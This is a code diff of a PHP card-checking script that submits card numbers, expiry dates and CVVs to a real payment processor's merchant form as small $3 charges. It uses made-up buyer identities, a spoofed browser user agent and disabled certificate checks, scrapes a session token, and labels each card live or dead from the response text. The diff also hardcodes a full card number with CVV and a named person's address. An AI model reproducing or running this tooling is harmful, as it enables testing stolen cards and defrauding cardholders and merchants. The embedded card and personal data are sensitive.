@@ -21,6 +21,7 @@ function RandAll($panjang) {
 }
 
 function RandNum($panjang) {
+    $unik = '';
     $pstring = "123456789";
     $plen = strlen($pstring);
     for ($i = 1; $i <= $panjang; $i++) {
@@ -154,7 +155,7 @@ function CardCheck($card, $mes, $ano, $cvv) {
     $group_card = $sub_card1 . '-' . $sub_card2 . '-' . $sub_card3 . '-' . $sub_card4 . '-';
     $sub_Ano = substr($ano, 2, 4);
     $group_mes = $mes;
-    $group_ano = $sub_Ano . "" . $group_mes;
+    $group_ano = $sub_Ano;
     $group_cvv = $cvv;
     $group_zip = RandNum("5");
     $tel1 = RandNum("2");
@@ -166,12 +167,18 @@ function CardCheck($card, $mes, $ano, $cvv) {
     $ip3 = RandNum("3");
     $ip4 = RandNum("3");
     $ip5 = $ip1 . "." . $ip2 . "." . $ip3 . "." . $ip4;
+    $trnOrderNumber = RandNum('9');
 
 
     $ch = curl_init();
-    $post = "payFormParams=payment_type%3DPaymentForm%26merchant_id%3D117587301%26trnType%3DP%26errorPage%3D%252Fscripts%252Fpayment%252Fpayment%252Easp%26approvedPage%3D%26declinedPage%3D%26epe_client_found%3Dfalse%26trnLanguage%3Deng%26shipping_method%3D%26ref1%3D%26ref2%3D%26ref3%3D%26ref4%3D%26ref5%3D%26shippingMethod%3D%26deliveryEstimate%3D%26ordTax1Price%3D%26ordTax2Price%3D%26ordItemPrice%3D0%26ordShippingPrice%3D0%26trnOrderNumber%3D117587301%26trnAmount%3D3%252E00%26ordName%3DEdwin%2BMarin%26ordEmailAddress%3Dedw%252Dmarin%2540yahoo%252Eca%26ordPhoneNumber%3D%2528757%2529%2B642%252D7675%26ordAddress1%3D%2B2933%2BRed%2BDale%26ordCity%3DBuckingham%2B%2Bcircle%26ordProvince%3DVA%26ordPostalCode%3D24195%252D5432%26ordCountry%3DUS%26paymentMethod%3DCC%26trnCardOwner%3DEdwin%2BMarin%26trnCardCvd%3D$cvv%26cavBirthMonth%3D%26cavBirthDay%3D%26cavBirthYear%3D%26cavSin%3D%26paymentAction%3D%26trnCardNumber%3D$num%26trnExpMonth%3D$mes%26trnExpYear%3D$ano%26aDFinancingType%3D%26aDPlanNumber%3D%26aDGracePeriod%3D%26aDTerm%3D";
+    //$urlPost = "https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301";
+    $urlPost = "https://www.beanstream.com/scripts/process_transaction.as";
+    
+    //$post = "sessionToken=" . getSession() . "&paymentAction=&merchant_id=117587301&preview=&visaCheckoutCallId=&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&ordName=Mr+Lowan+Drye&ordPhoneNumber=%28216%29+801-4176&ordAddress1=+5784+Cozy+Embers+Walk&ordAddress2=&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315-7116&ordCountry=US&ordEmailAddress=lodr%40freewebmail.com&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipProvince=&shipPostalCode=&shipCountry=&trnOrderNumber=$trnOrderNumber&trnAmount=3.00&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardType=MC&trnCardNumber=$group_card&trnExpMonth=$group_mes&trnExpYear=$group_ano&trnCardCvd=$group_cvv&trnComments=";
+    $post = "payFormParams='payment_type=PaymentForm&merchant_id=117587301&trnType=P&errorPage=%2Fscripts%2Fpayment%2Fpayment%2Easp&approvedPage=&declinedPage=&epe_client_found=false&trnLanguage=eng&shipping_method=&ref1=&ref2=&ref3=&ref4=&ref5=&shippingMethod=&deliveryEstimate=&ordTax1Price=&ordTax2Price=&ordItemPrice=0&ordShippingPrice=0&trnOrderNumber=22157717&trnAmount=3%2E00&ordName=Mr+Lowan+Drye&ordEmailAddress=lodr%40freewebmail%2Ecom&ordPhoneNumber=%28216%29+801%2D4176&ordAddress1=+5784+Cozy+Embers+Walk&ordCity=Watertown&ordProvince=OH&ordPostalCode=45315%2D7116&ordCountry=US&paymentMethod=CC&trnCardOwner=Mr+Lowan+Drye&trnCardCvd=958&cavBirthMonth=&cavBirthDay=&cavBirthYear=&cavSin=&paymentAction=&trnCardNumber=5512%2D3871%2D3216%2D8841%2D&trnExpMonth=09&trnExpYear=19&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm='";
 
-    curl_setopt($ch, CURLOPT_URL, 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301');
+    curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
+    curl_setopt($ch, CURLOPT_URL, $urlPost);
     curl_setopt($ch, CURLOPT_HEADER, 1);
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'); // RADOM DOS NAVEGADORES
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -184,16 +191,26 @@ function CardCheck($card, $mes, $ano, $cvv) {
     curl_setopt($ch, CURLOPT_COOKIEFILE, '/CardCheck_logs.txt');
     curl_setopt($ch, CURLOPT_VERBOSE, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_REFERER, 'https://www.bowery.org/donate/form/?s_src=S0873&s_subsrc=DPG&donation-amount=3&donation-program=1023');
+    curl_setopt($ch, CURLOPT_REFERER, 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301');
     curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
     $data = curl_exec($ch);
+    $curl_headers = curl_getinfo ($ch , CURLINFO_HEADER_OUT);
     curl_close($ch);
+    
+    
+    echo "<pre>";
+    print_r($curl_headers);
+    print_r($data);
+    echo "</pre>";
+    die();
+    
+    echo $data;
 
 
     if ($data) {
-        if (preg_match("The transaction has been declined because of an AVS mismatch.", $data)) {
+        if (preg_match("Transaction Declined", $data)) {
             echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC: {$card}|{$mes}|{$ano}|{$cvv}  $   - DIE </div>";
-        } elseif (preg_match("The transaction has been declined because of an AVS mismatch.", $data)) {
+        } elseif (preg_match("Transaction Declined", $data)) {
             echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC : {$card}|{$mes}|{$ano}|{$cvv}  $  - DIE Cartao Nao suportado </div>";
         } elseif (preg_match("THANK YOU!", $data)) {
 
@@ -236,4 +253,40 @@ function CardCheck($card, $mes, $ano, $cvv) {
             echo "<div class='alert alert-danger' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}:  - Resposta : Codigo errado anta. </div>";
         }
     }
+}
+
+function getSession() {
+
+    $ch = curl_init();
+    $url = 'https://www.beanstream.com/scripts/payment/payment.asp?merchant_id=117587301';
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'); // RADOM DOS NAVEGADORES
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_COOKIESESSION, false);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
+    curl_setopt($ch, CURLOPT_COOKIEJAR, '/CardCheck_logs.txt');
+    curl_setopt($ch, CURLOPT_COOKIEFILE, '/CardCheck_logs.txt');
+    curl_setopt($ch, CURLOPT_VERBOSE, 1);
+    curl_setopt($ch, CURLOPT_POST, 0);
+    curl_setopt($ch, CURLOPT_REFERER, $url);
+    $data = curl_exec($ch);
+    
+    $logName = './session.log';
+    file_put_contents($logName, $data);
+    
+    $file = fopen($logName,'r');
+    
+    while($linha = fgets($file)) {
+        if ($pos = strpos($linha, 'sessionToken')) {
+            $token = substr($linha, ($pos + 41), 32);
+            return $token;
+        }
+    }
+    
+    die('Token não encontrado');
 }
